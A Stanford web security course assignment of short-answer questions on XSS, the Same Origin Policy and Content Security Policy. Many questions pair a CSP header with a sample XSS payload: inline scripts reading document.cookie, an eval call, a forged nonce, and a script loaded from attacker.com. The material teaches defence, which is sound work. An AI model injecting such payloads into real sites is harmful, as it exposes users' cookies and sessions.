## Assignment 2 – Oh What a Tangled Web We Weave 🕸

- **Points:** 63
- **Due:** Thursday, November 7 at 11:59pm

Welcome to Assignment 2 for [CS 253: Web Security](https://cs253.stanford.edu). ✨

### Short Answer Questions

Your answers should be concise. Unless otherwise specified, keep answers to 100 words or fewer.

### Code Injection

1. You and a friend built a site that accepts and displays user-generated content. You recently read [the XKCD comic about code injection](https://xkcd.com/327/) which made you realize that you're not sanitizing user-submitted data anywhere in your web app. You realize that you're almost certainly vulnerable to Cross site scripting (XSS) and SQL injection attacks – yikes!

  Rereading the comic, you notice it ends with the phrase "I hope you've learned to sanitize your database inputs". Your friend suggests solving the issue by escaping all user-submitted data *before* inserting it into the database. Your friend argues that by sanitizing the *inputs* to the database as the comic suggests,  the data can then be extracted from the database and safely used in HTML and SQL without further escaping.

  Is this a valid argument? (Yes/No) Why or why not?

2. You and a friend decide to build an internal dashboard that will show real-time HTTP requests that are being sent by visitors to your site. The dashboard displays information about each HTTP request received by the web server, including the client's IP address, HTTP method, URL, query parameters, referrer URL, and user agent name.

  Incidentally, this is the exact set of information that most popular web servers like Nginx or Apache print into the server log files. Here is what one line from such a log file looks like:

  ```yml
  12.34.56.78 - - [17/Oct/2019:05:01:59 +0000] "GET /api/midi/search?q=hi&page=0 HTTP/1.0" 200 178 "https://example.com/search?q=h" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"
  ```

  The internal dashboard will only be used by you and your friend and will not be exposed to the broader internet since the logs reveal information about your site visitors. Your friend argues that there is no need to worry about XSS vulnerabilites in an internal-only dashboard since neither of you would create an XSS attack to use against the other. Given that, they see no way that an XSS attack could occur.

  Is this a valid argument? (Yes/No) Why or why not?

3. Name a real-world case where adherence to the Robustness principle (a.k.a. Postel's law) caused a system to have worse security. Explain how the Robustness principle led to the system having worse security properties.

### Same Origin Policy

4. Name three ways that the Same Origin Policy protects a website.

5. Can JavaScript code running on **attacker.com** cause a GET request to be sent to **victim.com**? (Yes/No)

6. Can JavaScript code running on **attacker.com** use the `fetch()` API to send a GET request to **victim.com** and read the HTTP response body? (Yes/No)

  Assume no CORS headers are present on the response.

7. Can JavaScript code running on **attacker.com** submit a form via a POST request to **victim.com**? (Yes/No)

8. A fascinating Same origin policy "bypass" was described in ["Cross-Origin JavaScript Capability Leaks: Detection, Exploitation, and Defense"](https://www.usenix.org/conference/usenixsecurity09/technical-sessions/presentation/cross-origin-javascript-capability-leaks), a talk at USENIX '09 (one of the top security conferences). How could an attacker use this browser implementation bug to bypass the same origin policy? What was the key reason for the bug? What was the proposed mitigation? Please keep your answer to 200 words or fewer.

### Content Security Policy

Content Security Policy (CSP) is one of the best ways to protect your site against XSS. A properly written CSP can **completely** protect your site from reflected and stored XSS attacks, even in the presence of a bug that allows the attacker to add their own HTML code to the site.

For all questions, you should assume the user agent is a modern browser that supports the latest Content Security Policy specification, [CSP Level 3](https://www.w3.org/TR/CSP3/).

You may find these resources useful:

- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [MDN: `Content-Security-Policy` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)

9. An attacker takes advantage of a vulnerability in your site to inject an XSS payload into the HTML page sent by your server. Fortunately, you set up a CSP in case this happened because you follow a defense-in-depth security approach.

  Would the following CSP prevent the XSS attack? (Yes/No)

  Why or why not?

  ```http
  Content-Security-Policy: script-src 'self';
  ```

  ```html
  <script>alert(document.cookie)</script>
  ```

10. Would the following CSP prevent the XSS attack? (Yes/No)

  Why or why not?

  ```http
  Content-Security-Policy: default-src *; script-src 'self';
  ```

  ```html
  <script>alert(document.cookie)</script>
  ```

11. Would the following CSP prevent the XSS attack? (Yes/No)

  Why or why not?

  ```http
  Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-eval'; connect-src 'self'; img-src 'self'; style-src 'self';
  ```

  ```html
  <script>alert(document.cookie)</script>
  ```

12. Would the following CSP prevent the XSS attack? (Yes/No)

  Why or why not?

  ```http
  Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-eval'; connect-src 'self'; img-src 'self'; style-src 'self';
  ```

  ```html
  <script>eval('alert(document.cookie)')</script>
  ```

13. Would the following CSP prevent the XSS attack? (Yes/No)

  Why or why not?

  ```http
  Content-Security-Policy: default-src *; script-src 'self'; connect-src *; img-src *; style-src *;
  ```

  ```html
  <script src='https://attacker.com/xss.js'></script>
  ```

14. Would the following CSP prevent the XSS attack? (Yes/No)

  Why or why not?

  ```http
  Content-Security-Policy: default-src 'none'; script-src 'self' https:; connect-src 'none'; img-src 'none'; style-src 'none';
  ```

  ```html
  <script src='https://attacker.com/xss.js'></script>
  ```

15. Would the following CSP prevent the XSS attack? (Yes/No)

  Why or why not?

  ```http
  Content-Security-Policy: script-src 'self' 'nonce-R28gU3RhbmZvcmQh';
  ```

  ```html
  <script>alert(document.cookie)</script>
  ```

16. Would the following CSP prevent the XSS attack? (Yes/No)

  Why or why not?

  ```http
  Content-Security-Policy: script-src 'self' 'nonce-R28gU3RhbmZvcmQh';
  ```

  ```html
  <script nonce='xss'>alert(document.cookie)</script>
  ```

17. Would the following CSP prevent the XSS attack? (Yes/No)

  Why or why not?

  ```http
  Content-Security-Policy: script-src 'self' 'nonce-R28gU3RhbmZvcmQh' 'unsafe-inline';
  ```

  ```html
  <script nonce='xss'>alert(document.cookie)</script>
  ```

18. Would the following CSP prevent the XSS attack? (Yes/No)

  Why or why not?

  ```http
  Content-Security-Policy: script-src 'self';
  ```

  ```html
  <script src='/api/echo?str=alert(document.cookie)'></script>
  ```

  Where `/api/echo` is a working API endpoint on the victim webserver that replies back with whatever string it receives in the `str` query parameter. For example, the URL `/api/echo?str=hello` returns an HTTP response with a body of `hello`.

  In case it makes a difference, you can assume the API response has a `Content-Type` header with a value of `text/plain`.

19. Assume that **victim.com** is protected with the following CSP:

  ```http
  Content-Security-Policy: script-src 'self' 'nonce-<nonce-value-here>';
  ```

  The operator of **attacker.com** attempts to subvert **victim.com**'s CSP by visitng **victim.com** and copying the nonce they observe in the CSP header into their XSS attack payload:

  ```html
  <script nonce='<nonce-value-here>'>alert(document.cookie)</script>
  ```

  Would the CSP prevent the XSS attack? (Yes/No) Why or why not?

  (Assume that **victim.com** has properly implemented their CSP nonces.)

20. Read the paper ["CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy"](https://ai.google/research/pubs/pub45542). Explain the problem that `'strict-dynamic'` keyword solves.

21. Survey Questions

- Roughly how long did you spend on this assignment? (required)
- What was your favorite part of this assignment? (required)
- What was your least favorite part of this assignment? (required)
- Any other feedback for this assignment? (optional)

## Submit

### Gradescope

We'll use [Gradescope](https://gradescope.com) for submissions. Enroll with the code `97BGZB`.

### The moment of truth

When you're ready to submit your work, upload your assignment in PDF form to Gradescope.

You should submit early and often! There's no downside to repeatedly submitting your assignment.

## Questions?

Come to office hours or [post in Piazza](https://piazza.com/stanford/fall2019/cs253).
